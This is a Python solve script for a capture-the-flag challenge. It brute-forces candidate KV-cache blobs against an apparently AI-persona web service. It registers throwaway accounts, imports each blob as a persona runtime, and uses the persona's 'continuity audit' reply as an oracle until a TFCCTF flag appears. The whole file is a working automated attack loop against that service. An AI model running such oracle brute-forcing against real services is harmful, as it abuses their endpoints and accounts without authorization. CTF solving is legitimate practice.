#!/usr/bin/env python3
"""
Brute force the last two grammar slots through the /continue accept oracle.

Uploads each candidate KV cache blob as a persona runtime and asks for a
continuity audit. The server answers with the flag only when the sha256 over
the submitted tensors equals the digest of its own resident cache, so this is a
clean all-or-nothing test that also proves fp32 bit exactness across machines.

Resumable: scratch/audit_state.json records every index already tried.

Usage:
    ctf-python solve/audit_many.py <base-url> [blob-dir] [order-file]
"""
import json
import os
import secrets
import subprocess
import sys
import time

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
SCRATCH = os.path.join(ROOT, "scratch")
STATE = os.path.join(SCRATCH, "audit_state.json")
PASSWORD = "hotwater12345"
CONTAINER = "nohotwater-local"


def load_state():
    if os.path.exists(STATE):
        return json.load(open(STATE))
    return {"tried": [], "rejected": [], "flag": None}


def save_state(state):
    json.dump(state, open(STATE, "w"), ensure_ascii=False, indent=1)


def wait_healthy(base, budget=1800):
    """GET /health is the only honest readiness test. The ingress placeholder
    answers GET / with 200, GET /health with 404 and every POST with 405."""
    deadline = time.time() + budget
    while time.time() < deadline:
        try:
            r = requests.get(base + "/health", timeout=25)
            if r.status_code == 200 and "ok" in r.text:
                return True
            print(f"[wait] /health {r.status_code}", flush=True)
        except Exception as error:  # noqa: BLE001
            print(f"[wait] {error!r}"[:110], flush=True)
        time.sleep(8)
    return False


def fresh_session(base):
    s = requests.Session()
    for attempt in range(6):
        try:
            name = "a" + secrets.token_hex(8)
            r = s.post(base + "/api/accounts",
                       json={"username": name, "password": PASSWORD}, timeout=60)
            r.raise_for_status()
            return s, r.json()["session"]
        except Exception as error:  # noqa: BLE001
            last = error
            time.sleep(2 + 2 * attempt)
    raise last


def blob_for(index, blob_dir):
    path = os.path.join(blob_dir, f"{index}.b64")
    if os.path.exists(path):
        return open(path).read().strip()
    # pull it out of the build container on demand
    local = os.path.join(SCRATCH, "blobs99")
    os.makedirs(local, exist_ok=True)
    dst = os.path.join(local, f"{index}.b64")
    subprocess.run(["docker", "cp", f"{CONTAINER}:/tmp/blobs99/{index}.b64", dst], check=True)
    return open(dst).read().strip()


def try_one(base, session, token, blob):
    body = {"manifest": {"name": "Mira", "capabilities": ["memory.search"]},
            "memories": [{"text": "audit"}],
            "runtime": {"kv_cache": {"format": "safetensors/base64", "cache": blob}}}
    r = session.post(base + "/api/v1/import", json=body,
                     headers={"x-soul-session": token}, timeout=300)
    if r.status_code != 201:
        return None, f"import {r.status_code} {r.text[:160]}"
    pid = r.json()["id"]
    r = session.post(f"{base}/api/personas/{pid}/chat",
                     json={"message": "continuity audit"},
                     headers={"x-soul-session": token}, timeout=300)
    if r.status_code != 200:
        return None, f"chat {r.status_code} {r.text[:160]}"
    return r.json().get("reply", ""), None


def main():
    base = sys.argv[1].rstrip("/")
    blob_dir = sys.argv[2] if len(sys.argv) > 2 else os.path.join(SCRATCH, "blobs99")
    combos = json.load(open(os.path.join(SCRATCH, "combos99.json")))
    order = list(range(len(combos)))
    if len(sys.argv) > 3 and os.path.exists(sys.argv[3]):
        order = json.load(open(sys.argv[3]))
    state = load_state()
    tried = set(state["tried"])
    if not wait_healthy(base):
        print("[!] brain never came up", flush=True)
        return 3
    session, token = fresh_session(base)
    fails = 0
    for index in order:
        if index in tried:
            continue
        combo = combos[index]
        try:
            blob = blob_for(index, blob_dir)
        except Exception as error:  # noqa: BLE001
            print(f"[!] {index} blob missing: {error}", flush=True)
            continue
        reply, problem = try_one(base, session, token, blob)
        if problem:
            fails += 1
            print(f"[!] {index} {problem[:90]}", flush=True)
            if "405" in problem or "502" in problem or "404" in problem:
                # the pod bounced and the ingress is back on the placeholder
                if not wait_healthy(base):
                    print("[!] pod did not come back", flush=True)
                    break
                session, token = fresh_session(base)
                fails = 0
                continue
            if "401" in problem or "403" in problem:
                session, token = fresh_session(base)
            time.sleep(min(2 * fails, 20))
            if fails > 40:
                print("[!] too many failures, stopping", flush=True)
                break
            continue
        fails = 0
        tried.add(index)
        state["tried"] = sorted(tried)
        if "TFCCTF{" in reply:
            print(f"[FLAG] index {index} I3={combo['I3']!r} T3={combo['T3']!r}", flush=True)
            print(reply, flush=True)
            state["flag"] = reply
            state["winner"] = combo
            save_state(state)
            return 0
        print(f"[-] {index:3d} I3={combo['I3']!r:28} T3={combo['T3']!r:42} "
              f"{reply[:60]!r}", flush=True)
        save_state(state)
    print("[!] exhausted without a flag", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
